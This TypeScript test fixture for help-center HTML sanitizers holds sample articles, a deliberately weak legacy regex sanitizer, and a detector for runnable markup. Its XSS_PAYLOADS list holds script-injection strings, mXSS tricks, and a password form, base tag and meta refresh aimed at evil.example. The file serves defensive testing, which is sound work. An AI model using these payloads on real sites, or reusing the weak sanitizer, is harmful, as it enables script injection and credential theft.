/**
 * Article bodies for the help centers' sanitizer tests (helpArticleHtml.test.ts
 * for the SPA's, helpArticleHtmlServer.test.ts for the server-rendered one).
 *
 * ARTICLES are written as DOMPurify serializes them (`<br>`, `<img …>`), so
 * an article that survives comes out byte for byte; sanitize-html writes the
 * void tags as `<br />` (xhtmlVoids). executableParts judges an output the
 * way a browser reads it, without the allow-list itself: it parses the HTML
 * inside the page's <article> and names whatever could run or reach out.
 */

/** Articles as the editor writes them, and as an import or the API may bring them. */
export const ARTICLES: Record<string, string> = {
  'the editor (headings, marks, lists, quote, code, links)':
    '<h2>Getting started</h2>' +
    '<p>Open <strong>Settings</strong>, then <em>Widget</em> and press <u>Save</u>. <s>The old menu</s> is gone.</p>' +
    '<ul><li><p>Pick a template</p></li><li><p>Pick a colour</p></li></ul>' +
    '<ol start="3"><li><p>Publish</p></li></ol>' +
    '<blockquote><p>Changes show on your site within a minute.</p></blockquote>' +
    '<pre><code>&lt;script src="https://cdn.example.com/loader.js"&gt;&lt;/script&gt;</code></pre>' +
    '<p>Read <a target="_blank" rel="noopener noreferrer nofollow" href="https://example.com/docs?a=1&amp;b=2">the docs</a>' +
    ' or <a href="/help/en/a/billing" rel="noopener noreferrer">billing</a>.<br>' +
    'Mail <a href="mailto:help@example.com" rel="noopener noreferrer">us</a>' +
    ' or call <a href="tel:+982112345678" rel="noopener noreferrer">us</a>.</p>' +
    '<hr><h3>Next steps</h3><p>Run <code>npm install</code> again.</p>',
  'images (absolute, relative, in a figure)':
    '<h4>The dashboard</h4>' +
    '<figure><img src="https://cdn.example.com/kb/dashboard.png" alt="Dashboard" width="640" height="360">' +
    '<figcaption>Your dashboard after setup</figcaption></figure>' +
    '<p><img src="/storage/kb/steps.png" alt=""></p>',
  'a table':
    '<table><caption>Plans</caption><colgroup><col span="2"></colgroup>' +
    '<thead><tr><th scope="col">Plan</th><th scope="col">Price</th></tr></thead>' +
    '<tbody><tr><td>Basic</td><td>Free</td></tr><tr><td colspan="2">Contact us for more</td></tr></tbody></table>',
  'Persian, right to left':
    '<h2>راهنمای شروع</h2>' +
    '<p dir="rtl">برای فعال‌سازی ابزارک گفتگو به <strong>تنظیمات</strong> بروید و «ذخیره» را بزنید.</p>' +
    '<ul dir="rtl"><li><p>مرحله‌ی اول: <a href="https://example.com/fa" rel="noopener noreferrer">راهنما</a></p></li></ul>',
};

/** sanitize-html's spelling of the same HTML: the void tags self-closed. */
export function xhtmlVoids(html: string): string {
  return html.replace(/<(br|hr|img|col)\b([^>]*)>/g, '<$1$2 />');
}

/**
 * Payloads that must come out inert: the two the old regex let through, the
 * usual handler and URL tricks, and the elements that run, load or reach out
 * (a form, a base, a meta refresh, an iframe's srcdoc, an embed).
 */
export const XSS_PAYLOADS: Array<[string, string]> = [
  ['an svg with onload', '<svg/onload=alert(1)>'],
  // Shaped like the four advisories against sanitize-html 2.17.5 (articleHtml.ts).
  ['a textarea closed with a solidus', '<textarea></textarea/><img src=x onerror=alert(1)>'],
  ['a noscript region ended early', '<noscript><p title="</noscript><img src=x onerror=alert(1)>"></noscript>'],
  ['an svg animate setting a javascript href', '<svg><a><animate attributeName="href" to="javascript:alert(1)"/><text>x</text></a></svg>'],
  ['a meta refresh to javascript', '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">'],
  ['a script tag split by another', '<scr<script></script>ipt>alert(1)</script>'],
  ['a script', '<p>Hi</p><script>alert(1)</script>'],
  ['an img onerror, bare', '<img src=x onerror=alert(1)>'],
  ['an img onerror, quoted', '<img src="x" onerror="alert(1)">'],
  ['an img onerror, slashes for spaces', '<img/src="x"/onerror=alert(1)>'],
  ['an IMG ONERROR in capitals', '<IMG SRC=x ONERROR=alert(1)>'],
  ['an img onerror, a newline before =', '<img src=x onerror\n=alert(1)>'],
  ['an img onerror, tabs for spaces', '<img\tsrc=x\tonerror=alert(1)>'],
  ['a javascript: link, hex entity', '<a href="jav&#x61;script:alert(1)">x</a>'],
  ['a javascript: link, decimal entity', '<a href="&#106;avascript:alert(1)">x</a>'],
  ['a javascript: link, &colon;', '<a href="javascript&colon;alert(1)">x</a>'],
  ['a javascript: link, a tab inside', '<a href="java\tscript:alert(1)">x</a>'],
  ['a javascript: link, leading space and control character', '<a href=" \u0001javascript:alert(1)">x</a>'],
  ['a vbscript: link', '<a href="vbscript:msgbox(1)">x</a>'],
  ['a data: link', '<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">x</a>'],
  ['a data: image', '<img src="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+">'],
  ['a form', '<form action="https://evil.example/login"><input name="password" type="password"><button formaction="javascript:alert(1)">Sign in</button></form>'],
  ['a base', '<base href="https://evil.example/"><a href="/help">x</a>'],
  ['a meta refresh', '<meta http-equiv="refresh" content="0;url=https://evil.example/">'],
  ['an iframe srcdoc', '<iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;"></iframe>'],
  ['an iframe embed', '<iframe src="https://www.youtube.com/embed/x"></iframe>'],
  ['an object and an embed', '<object data="javascript:alert(1)"></object><embed src="javascript:alert(1)">'],
  ['a style element', '<style>body{display:none}</style><p>x</p>'],
  ['a style, class and id', '<p style="position:fixed;inset:0" class="fixed inset-0" id="root">x</p>'],
  ['an svg link', '<svg><a xlink:href="javascript:alert(1)"><text x="0" y="20">x</text></a></svg>'],
  ['a math mXSS', '<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>'],
  ['a noscript mXSS', '<noscript><p title="</noscript><img src=x onerror=alert(1)>"></noscript>'],
  ['a template', '<template><img src=x onerror=alert(1)></template>'],
  ['a textarea', '<textarea><img src=x onerror=alert(1)></textarea>'],
  ['a comment trick', '<!--><img src=x onerror=alert(1)>-->'],
  ['closing the article', '</article><script>alert(1)</script><article>'],
];

/** The regex both help centers sanitized with before, kept to show what it let through. */
export function oldRegexSanitize(html: string): string {
  return html
    .replace(/<script\b[^>]*>[\s\S]*?<\/script>/gi, '')
    .replace(/<style\b[^>]*>[\s\S]*?<\/style>/gi, '')
    .replace(/<iframe\b[^>]*>[\s\S]*?<\/iframe>/gi, '')
    .replace(/\son[a-z]+\s*=\s*"[^"]*"/gi, '')
    .replace(/\son[a-z]+\s*=\s*'[^']*'/gi, '')
    .replace(/\son[a-z]+\s*=\s*[^\s>]+/gi, '')
    .replace(/javascript:/gi, '');
}

const XHTML = 'http://www.w3.org/1999/xhtml';
const FORBIDDEN_TAGS = new Set([
  'script', 'style', 'iframe', 'frame', 'object', 'embed', 'svg', 'math', 'form', 'input', 'button',
  'textarea', 'select', 'base', 'meta', 'link', 'noscript', 'template', 'title',
]);
const URL_ATTRIBUTES = new Set(['href', 'src', 'action', 'formaction', 'data', 'xlink:href', 'srcset', 'poster']);
const SAFE_PROTOCOLS = new Set(['http:', 'https:', 'mailto:', 'tel:']);

/**
 * What a browser would find runnable in `html` placed in the help center's
 * <article>: a forbidden or foreign element, an on* handler, a style, class
 * or id, a URL with a scheme other than http(s), mailto or tel (read as the
 * browser's URL parser reads it), or markup that ends the article early.
 */
export function executableParts(html: string): string[] {
  const doc = new DOMParser().parseFromString(
    `<!doctype html><html><head><title>Help</title></head><body><article>${html}</article><p id="after"></p></body></html>`,
    'text/html',
  );
  const found: string[] = [];
  if (doc.head.children.length !== 1) found.push('an element in <head>');
  const article = doc.querySelector('article');
  if (doc.body.firstElementChild !== article || doc.getElementById('after')?.previousElementSibling !== article) {
    found.push('the article ended early');
  }
  for (const el of Array.from(doc.querySelectorAll('article *'))) {
    const tag = el.localName;
    if (el.namespaceURI !== XHTML) found.push(`<${tag}> (foreign)`);
    if (FORBIDDEN_TAGS.has(tag)) found.push(`<${tag}>`);
    for (const attr of Array.from(el.attributes)) {
      const name = attr.name.toLowerCase();
      if (name.startsWith('on') || name === 'style' || name === 'class' || name === 'id' || name === 'srcdoc') {
        found.push(`${tag}[${name}]`);
      }
      if (URL_ATTRIBUTES.has(name)) {
        let protocol = '';
        try { protocol = new URL(attr.value, 'https://help.example/').protocol; } catch { protocol = 'unparsable'; }
        if (!SAFE_PROTOCOLS.has(protocol)) found.push(`${tag}[${name}=${protocol}]`);
      }
    }
  }
  return found;
}
